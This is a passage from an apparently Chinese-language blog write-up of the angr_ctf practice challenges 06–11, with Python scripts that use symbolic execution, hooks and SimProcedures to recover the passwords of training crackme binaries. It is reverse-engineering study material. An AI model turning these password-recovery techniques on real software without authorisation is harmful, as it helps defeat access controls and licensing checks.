<span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good, avoid=is_bad)</span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">    pass1 = found_state.solver.<span class="built_in">eval</span>(p1, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    pass2 = found_state.solver.<span class="built_in">eval</span>(p2, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    pass3 = found_state.solver.<span class="built_in">eval</span>(p3, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    pass4 = found_state.solver.<span class="built_in">eval</span>(p4, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Solution: &#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(pass1.decode(<span class="string">&quot;utf-8&quot;</span>), pass2.decode(<span class="string">&quot;utf-8&quot;</span>), pass3.decode(<span class="string">&quot;utf-8&quot;</span>), pass4.decode(<span class="string">&quot;utf-8&quot;</span>)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    Exception(<span class="string">&quot;Solution not found&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h3><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250928232415534.png" alt="image-20250928232415534"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&#x27;./dist/06_angr_symbolic_dynamic_memory&#x27;</span>)</span><br><span class="line">initial_state = project.factory.blank_state(addr=<span class="number">0x8048699</span>)</span><br><span class="line"></span><br><span class="line">arg1 = claripy.BVS(<span class="string">&#x27;arg1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">arg2 = claripy.BVS(<span class="string">&#x27;arg2&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">addr1 = <span class="number">0xABCC8A4</span></span><br><span class="line">addr2 = <span class="number">0xABCC8AC</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接分配地址，angr会自行分配内存</span></span><br><span class="line">heap_ptr1 = <span class="number">0x212340</span></span><br><span class="line">heap_ptr2 = <span class="number">0x312350</span></span><br><span class="line"></span><br><span class="line">initial_state.memory.store(addr1, heap_ptr1, endness = <span class="string">&#x27;LE&#x27;</span>)</span><br><span class="line">initial_state.memory.store(addr2, heap_ptr2, endness = <span class="string">&#x27;LE&#x27;</span>)</span><br><span class="line">initial_state.memory.store(heap_ptr1, arg1)</span><br><span class="line">initial_state.memory.store(heap_ptr2, arg2)</span><br><span class="line"></span><br><span class="line">simgr = project.factory.simulation_manager(initial_state)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">right</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wrong</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Try&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">simgr.explore(find=right, avoid=wrong)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    solution_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(solution_state.solver.<span class="built_in">eval</span>(arg1, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">    <span class="built_in">print</span>(solution_state.solver.<span class="built_in">eval</span>(arg2, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h3><p><strong>通过<code>angr.storage.SimFile</code>和<code>state.fs.insert</code>来插入符号化文件。</strong></p><p>读取输入通过ignore_me函数存储入OJKSQYDP.txt中，后续再通过从OJKSQYDP.txt中取出进行校验</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250929231306768.png" alt="image-20250929231306768"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">io = angr.Project(<span class="string">&#x27;./dist/07_angr_symbolic_file&#x27;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">state_addr = <span class="number">0x80488E7</span></span><br><span class="line">init_state = io.factory.blank_state(addr = state_addr)</span><br><span class="line"></span><br><span class="line">passwd0 = claripy.BVS(<span class="string">&#x27;passwd0&#x27;</span>,<span class="number">64</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line"><span class="comment">#%64s</span></span><br><span class="line"><span class="comment">#通过SimFile形成符号化文件</span></span><br><span class="line">simfile = angr.storage.SimFile(name = file_name,content = passwd0,size = <span class="number">64</span>)</span><br><span class="line"><span class="comment">#将SimFile插入state文件系统</span></span><br><span class="line">init_state.fs.insert(file_name,simfile)</span><br><span class="line"></span><br><span class="line">simgr = io.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">simgr.explore(find=is_succ,avoid=is_fail)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    so_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(so_state.solver.<span class="built_in">eval</span>(passwd0,cast_to=<span class="built_in">bytes</span>))</span><br></pre></td></tr></table></figure><h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><p>开始学怎么避免路径爆炸了，其实个人感觉hook，simProcedure，手动约束的思想都差不多。</p><h3 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h3><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250929232750517.png" alt="image-20250929232750517"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250929232759417.png" alt="image-20250929232759417"></p><p>但是与之前直接使用strcmp校验不同，这里使用的是一个自定义的按位校验，并且由于输入是16位，就将会进行16次的循环，每次循环都将经历一次if判断</p><p>将会产生2^16 &#x3D;&#x3D; 65536个判断分支，这么多的分支，就将会引发一个叫路径爆炸的问题，严重影响我们测试的效率</p><p>为此，我们可以自己去实现一个校验约束，直接跳过或者也可以理解为hook掉这个按位校验函数，这样就不会产生路径爆炸了</p><blockquote><p>你可能会有疑问，strcmp函数在底层实现也是按位比较，为什么在前面的题目中并没有提及路径爆炸问题</p><p>原因是angr在对于strcmp这种标准库自己实现了一套hook，使用了angr实现的strcmp去替换掉了标准库中调用的strcmp函数，避免了路径爆炸，这在下文中也有提及</p></blockquote><p>参考：<a href="https://zh-closure.github.io/2024/07/28/%E9%80%9A%E8%BF%87Angr-CTF%E5%85%A5%E9%97%A8Angr/#08-angr-constraints">通过Angr_CTF入门Angr | Closure</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">io = angr.Project(<span class="string">&#x27;./dist/08_angr_constraints&#x27;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">state_addr = <span class="number">0x8048622</span></span><br><span class="line">init_state = io.factory.blank_state(addr = state_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#%16s</span></span><br><span class="line">passwd0 = claripy.BVS(<span class="string">&#x27;passwd0&#x27;</span>,<span class="number">16</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">buffer_addr = <span class="number">0x804A050</span></span><br><span class="line">init_state.memory.store(buffer_addr,passwd0)</span><br><span class="line"></span><br><span class="line">simgr = io.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行至调用check</span></span><br><span class="line">check_addr = <span class="number">0x8048565</span></span><br><span class="line">simgr.explore(find=check_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    so_state = simgr.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    buffer_cu = so_state.memory.load(buffer_addr,<span class="number">16</span>) <span class="comment">#读出buffer处的数据</span></span><br><span class="line">    key = <span class="string">&quot;AUPDNNPROEZRJWKB&quot;</span></span><br><span class="line">    <span class="comment">#添加约束条件，自己实现一个校验</span></span><br><span class="line">    so_state.solver.add(buffer_cu == key)</span><br><span class="line"><span class="comment">#eval将对约束进行求解，也就是获取符合条件的值</span></span><br><span class="line">    so0 = so_state.solver.<span class="built_in">eval</span>(passwd0,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">format</span>(so0.decode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br></pre></td></tr></table></figure><h3 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h3><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250930230542092.png" alt="image-20250930230542092"></p><p>程序将获取两次输入，第一次输入经过complex_function处理后，再通过check_equals_XYMKBKUHNIQYNQXE与password进行比较；第二次输入将与经过complex_function处理后的password进行比较；并且可以看到在check_equals_XYMKBKUHNIQYNQXE中使用按位比较，将会出现路径爆炸问题</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250930230933054.png" alt="image-20250930230933054"></p><p>跟上题的不同之处是：这道题在到达了check地址之后还会执行，使用hook来做更方便一些。</p><p>指令长度为5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">io = angr.Project(<span class="string">&#x27;./dist/09_angr_hooks&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">init_state = io.factory.entry_state()</span><br><span class="line"></span><br><span class="line">check_addr = <span class="number">0x80486B3</span>  <span class="comment"># call check指令地址</span></span><br><span class="line">call_check_len = <span class="number">5</span>  <span class="comment"># 指令长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过地址进行HOOK</span></span><br><span class="line"><span class="meta">@io.hook(<span class="params">check_addr, length=call_check_len</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_check</span>(<span class="params">state</span>):</span><br><span class="line">    buffer_addr = <span class="number">0x804A054</span></span><br><span class="line">    <span class="comment"># %16s</span></span><br><span class="line">    buffer = state.memory.load(buffer_addr, <span class="number">16</span>)  <span class="comment"># 读取</span></span><br><span class="line">    key = <span class="string">&quot;XYMKBKUHNIQYNQXE&quot;</span></span><br><span class="line">    <span class="comment"># 返回值存储在eax</span></span><br><span class="line">    state.regs.eax = claripy.If(</span><br><span class="line">        buffer == key,</span><br><span class="line">        claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),  <span class="comment"># 32位寄存器</span></span><br><span class="line">        claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)  <span class="comment"># 32位寄存器</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">simgr = io.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find=is_succ, avoid=is_fail)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    so_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">    so0 = so_state.posix.dumps(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">format</span>(so0.decode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br></pre></td></tr></table></figure><h3 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h3><p>与上一题类似，但是本题的check函数被多次调用，可以使用函数名进行hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">io = angr.Project(<span class="string">&#x27;./dist/10_angr_simprocedures&#x27;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">init_state = io.factory.entry_state()</span><br><span class="line"></span><br><span class="line"><span class="comment">#继承SimProcedure</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hook</span>(angr.SimProcedure):</span><br><span class="line">    <span class="comment">#参照函数原型进行hook</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self,a1,a2</span>):</span><br><span class="line">        buffer_addr = a1 <span class="comment">#原函数1参数</span></span><br><span class="line">        buffer_len = a2 <span class="comment">#原函数2参数</span></span><br><span class="line">        <span class="comment">#读取</span></span><br><span class="line">        buffer = <span class="variable language_">self</span>.state.memory.load(</span><br><span class="line">            buffer_addr,</span><br><span class="line">            buffer_len</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        key = <span class="string">&quot;ORSDDWXHZURJRBDH&quot;</span></span><br><span class="line">        <span class="comment">#原函数有返回值</span></span><br><span class="line">        <span class="keyword">return</span> claripy.If(</span><br><span class="line">            buffer == key,</span><br><span class="line">            claripy.BVV(<span class="number">1</span>,<span class="number">32</span>),</span><br><span class="line">            claripy.BVV(<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">check_sym = <span class="string">&quot;check_equals_ORSDDWXHZURJRBDH&quot;</span> <span class="comment">#符号表获取</span></span><br><span class="line">io.hook_symbol(check_sym,Hook()) <span class="comment">#angr会自己去找和函数符号有关联的地址</span></span><br><span class="line">simgr = io.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find = is_succ,avoid=is_fail)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    so_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">    so0 = so_state.posix.dumps(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">format</span>(so0.decode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br></pre></td></tr></table></figure><h3 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h3><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250930232439461.png" alt="image-20250930232439461"></p><p>分段校验，对__isoc99_scanf进行hook</p><p>hook scanf函数来应对复杂格式的输入，向scanf的参数中存入内容，并且将值存到 globals 全局变量插件中</p><p>为什么要 hook <code>scanf</code></p><ol><li><strong><code>scanf</code> 会做格式化解析（十进制字符串 → 二进制整数）</strong>，如果不钩住，angr 要么模拟 <code>scanf</code> 的实现（复杂、慢），要么你需要把 stdin 做成符号并让 <code>scanf</code> 自己解析出整数，这会把“解析逻辑”也引入符号约束中，显著增加复杂度与求解难度。</li><li><strong>更直接的语义建模</strong>：题里 <code>scanf(&quot;%u %u&quot;, buffer0, buffer1)</code> 的效果是“把两个 32-bit 无符号整数写到内存”。我们只关心写入后的内存值被 <code>strncmp</code> 比较这一事实，hook 可以<strong>直接创建两个 32-bit 的符号位向量（BVS）并写入 <code>buffer0/1</code> 地址</strong>，使后续的 <code>strncmp</code> 约束直接作用在这些符号上，干净利落。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">io = angr.Project(<span class="string">&#x27;./dist/11_angr_sim_scanf&#x27;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">init_state = io.factory.entry_state()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hook</span>(angr.SimProcedure):</span><br><span class="line">    <span class="comment">#参照函数原型进行hook</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self,format_string,buffer0_addr,buffer1_addr</span>):</span><br><span class="line">        scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">        scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#原函数向buffer写入数据</span></span><br><span class="line">        <span class="comment">#向地址内写入符号位向量</span></span><br><span class="line">        <span class="variable language_">self</span>.state.memory.store(</span><br><span class="line">            buffer0_addr,</span><br><span class="line">            scanf0,</span><br><span class="line">            endness = io.arch.memory_endness</span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.state.memory.store(</span><br><span class="line">            buffer1_addr,</span><br><span class="line">            scanf1,</span><br><span class="line">            endness = io.arch.memory_endness</span><br><span class="line">        )</span><br><span class="line">        <span class="comment">#保存符号位变量（局部变量）为全局变量，方便我们后续访问</span></span><br><span class="line">        <span class="variable language_">self</span>.state.<span class="built_in">globals</span>[<span class="string">&#x27;so0&#x27;</span>] = scanf0</span><br><span class="line">        <span class="variable language_">self</span>.state.<span class="built_in">globals</span>[<span class="string">&#x27;so1&#x27;</span>] = scanf1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span 